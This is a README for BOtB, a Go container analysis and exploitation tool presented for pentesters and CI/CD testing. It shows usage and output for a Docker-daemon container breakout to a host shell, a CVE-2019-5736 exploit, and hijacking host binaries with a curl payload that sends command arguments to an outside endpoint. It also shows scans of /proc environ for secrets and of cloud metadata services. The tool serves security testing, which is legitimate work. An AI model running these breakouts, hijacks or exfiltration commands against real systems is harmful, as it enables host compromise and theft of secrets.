# Break out the Box (BOtB)
BOtB is a container analysis and exploitation tool designed to be used by pentesters and engineers while also being CI/CD friendly with common CI/CD technologies.


# What does it do?
BOtB is a CLI tool which allows you to:
- Exploit common container vulnerabilties
- Perform common container post exploitation actions
- Provide capability when certain tools or binaries are not available in the Container
- Use BOtB's capabilities with CI/CD technologies to test container deployments
- Perform the above in either a manual or automated approach

## Current Capabilities
- Find and Identify UNIX Domain Sockets
- Identify UNIX domain sockets which support HTTP
- Find and identify the Docker Daemon on UNIX domain sockets or on an interface
- Analyze and identify sensitive strings in ENV and process in the ProcFS i.e /Proc/{pid}/Environ
- Identify metadata services endpoints i.e http://169.254.169.254
- Perform a container breakout via exposed Docker daemons
- Perform a container breakout via CVE-2019-5736
- Hijack host binaries with a custom payload
- Perform actions in CI/CD mode and only return exit codes > 0

# Getting BOtB

BOtB is available as a binary in the Releases Section.

# Building BOtB

BOtB is written in GO and can be built using the standard GO tools. The following can be done to get you started:

Getting the Code:
```
go get github.com/brompwnie/botb
or
git clone git@github.com:brompwnie/botb.git
```

Building the Code:
```
govendor init
govendor add github.com/tv42/httpunix
govendor add github.com/kr/pty
go build -o botbsBinary
```

# Usage
BOtB can be compiled into a binary for the targeted platform and supports the following usage
```
./bob_linux_amd64 -h
[+] Break Out The Box
Usage of ./bob_linux_amd64:
  -aggr string
        Attempt to exploit RuncPWN (default "nil")
  -autopwn
        Attempt to autopwn exposed sockets
  -cicd
        Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0
  -endpointlist string
        Provide a wordlist (default "nil")
  -findDockerD
        Attempt to find Dockerd
  -hijack string
        Attempt to hijack binaries on host (default "nil")
  -http
        Hunt for Available UNIX Domain Sockets with HTTP
  -interfaces
        Display available network interfaces
  -metadata
        Attempt to find metadata services
  -path string
        Path to Start Scanning for UNIX Domain Sockets (default "/")
  -portscan string
        Attempt to portscan a host (default "nil")
  -recon
        Perform Recon of the Container ENV
  -socket
        Hunt for Available UNIX Domain Sockets
  -verbose
        Verbose output
  -wordlist string
        Provide a wordlist (default "nil")

```

The following usage examples will return a Exit Code > 0 by default when an anomaly is detected, this is depicted by "echo $?" which shows the exit code of the last executed command.

### Find UNIX Domain Sockets
```
#./bob_linux_amd64 -socket=true
[+] Break Out The Box
[+] Hunting Down UNIX Domain Sockets from: /
[!] Valid Socket: /var/meh
[+] Finished

#echo $?
1
```


### Find a Docker Daemon
```
#./bob_linux_amd64 -findDockerD=true
[+] Break Out The Box
[+] Looking for Dockerd
[!] Dockerd DOCKER_HOST found: tcp://0.0.0.0:2375
[+] Hunting Docker Socks
[!] Valid Docker Socket: /var/meh
[+] Finished

#echo $?
1
```

### Break out from Container via Exposed Docker Daemon
This approach will breakout into an interactive TTY on the host.
```
#./bob_linux_amd64 -autopwn=true    
[+] Break Out The Box
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to autopwn:  /var/meh
[+] Attempting to escape to host...
[+] Attempting in TTY Mode
./docker/docker -H unix:///var/meh run -t -i -v /:/host alpine:latest /bin/sh
chroot /host && clear
echo 'You are now on the underlying host'
You are now on the underlying host
/ # 
```

### Break out of a Container but in a CI/CD Friendly way
This approach does not escape into a TTY on the host but instead returns an Exit Code > 0 to indicate a successful container breakout.

```
#./bob_linux_amd64 -autopwn=true -cicd=true
[+] Break Out The Box
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to autopwn:  /var/meh
[+] Attempting to escape to host...
[!] Successfully escaped container
[+] Finished

#echo $?
1
```

### Exploit CVE-2019-5736 with a Custom Payload
Please note that for this exploit to work, a process has to be executed in the target container in this scenario.
```
#./bob_linux_amd64 -aggr='curl "https://some.endpoint.com?command=$0&param1=$1&param2=$2">/dev/null 2>&1'
[+] Break Out The Box[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS WILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...
[+] Attempting to exploit CVE-2019-5736 with command:  curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$
1&param2=$2">/dev/null 2>&1
[+] This process will exit IF an EXECVE is called in the Container or if the Container is manually stopped
[+] Finished
```

### Hijack Commands/Binaries on a Host with a Custom Payload
Please note that this can be used to test if external entities are executing commands within the container. Examples are Docker Exec and Kubetcl CP.

```
#./bob_linux_amd64 -hijack='curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$
1&param2=$2">/dev/null 2>&1'
[+] Break Out The Box
[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...
[+] Attempting to hijack binaries
[*] Command to be used:  curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$1&param2=$2">/dev/null 2>&1
[+] Currently hijacking:  /bin
[+] Currently hijacking:  /sbin
[+] Currently hijacking:  /usr/bin
[+] Finished
```

### Analyze ENV and ProcFS Environ for Sensitive Strings
By default BOtB will search for the two terms "secret" and "password".
```
 ./bob_linux_amd64 -recon=true
[+] Break Out The Box
[+] Performing Container Recon
[+] Searching /proc/* for data
[!] Sensitive keyword found in: /proc/1/environ -> 'PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=0e51200113eaTERM=xtermGOLANG_VERSION=1.12.4GOPATH=/gofoo=secretpasswordHOME=/root'
[!] Sensitive keyword found in: /proc/12/environ -> 'GOLANG_VERSION=1.12.4HOSTNAME=0e51200113eaGOPATH=/goPWD=/app/binHOME=/rootfoo=secretpasswordTERM=xtermSHLVL=1PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=./bob_linux_amd64OLDPWD=/bin'
[!] Sensitive keyword found in: /proc/self/environ -> 'HOSTNAME=0e51200113eaSHLVL=1HOME=/rootfoo=secretpasswordOLDPWD=/bin_=./bob_linux_amd64TERM=xtermPATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGOPATH=/goPWD=/app/binGOLANG_VERSION=1.12.4'
[!] Sensitive keyword found in: /proc/thread-self/environ -> 'HOSTNAME=0e51200113eaSHLVL=1HOME=/rootfoo=secretpasswordOLDPWD=/bin_=./bob_linux_amd64TERM=xtermPATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGOPATH=/goPWD=/app/binGOLANG_VERSION=1.12.4'
[+] Checking ENV Variables for secrets
[!] Sensitive Keyword found in ENV:  foo=secretpassword
[+] Finished

#echo $?
1
```

A wordlist can be supplied to BOtB to scan for particular keywords.
```
#cat wordlist.txt 
moo

# ./bob_linux_amd64 -recon=true -wordlist=wordlist.txt
[+] Break Out The Box
[+] Performing Container Recon
[+] Searching /proc/* for data
[*] Loading entries from: wordlist.txt
[+] Checking ENV Variables for secrets
[*] Loading entries from: wordlist.txt
[+] Finished

# echo $?
0
```

### Scan for Metadata Endpoints
BOtB by default scans for two Metadata endpoints.
```
#  ./bob_linux_amd64 -metadata=true                    
[+] Break Out The Box
[*] Attempting to query metadata endpoint: 'http://169.254.169.254/latest/meta-data/'
[*] Attempting to query metadata endpoint: 'http://kubernetes.default.svc/'
[+] Finished

# echo $?
0
```

BOtB can also be supplied with a list of endpoints to scan for.
```
#  cat endpoints.txt 
https://heroku.com

#  ./bob_linux_amd64 -metadata=true -endpointlist=endpoints.txt
[+] Break Out The Box
[*] Loading entries from: endpoints.txt
[*] Attempting to query metadata endpoint: 'https://heroku.com'
[!] Reponse from 'https://heroku.com' -> 200
[+] Finished

# echo $?
1
```


### Get Interfaces and IP's

```
#  ./bob_linux_amd64 -interfaces=true
[+] Break Out The Box
[+] Attempting to get local network interfaces
[*] Got Interface: lo
        [*] Got address: 127.0.0.1/8
[*] Got Interface: tunl0
[*] Got Interface: ip6tnl0
[*] Got Interface: eth0
        [*] Got address: 172.17.0.3/16
[+] Finished

```

# Issues, Bugs and Improvements
For any bugs, please submit an issue. There is a long list of improvements but please submit an Issue if there is something you want to see added to BOtB.

# References and Resources
This tool would not be possible without the contribution of others in the community, below is a list of resources that have helped me.

- https://docs.docker.com/engine/security/https/
- https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#cp
- https://docs.docker.com/engine/reference/commandline/exec/
- https://github.com/GoogleContainerTools/container-structure-test
- https://github.com/coreos/clair
- https://github.com/aquasecurity/docker-bench
- https://www.cisecurity.org/benchmark/docker/
- https://github.com/Frichetten/CVE-2019-5736-PoC
- https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-cve-2019-5736/
- https://www.twistlock.com/labs-blog/disclosing-directory-traversal-vulnerability-kubernetes-copy-cve-2019-1002101/
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-classic-platform.html
- https://github.com/wagoodman/dive


 # License
 BOtB is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0).
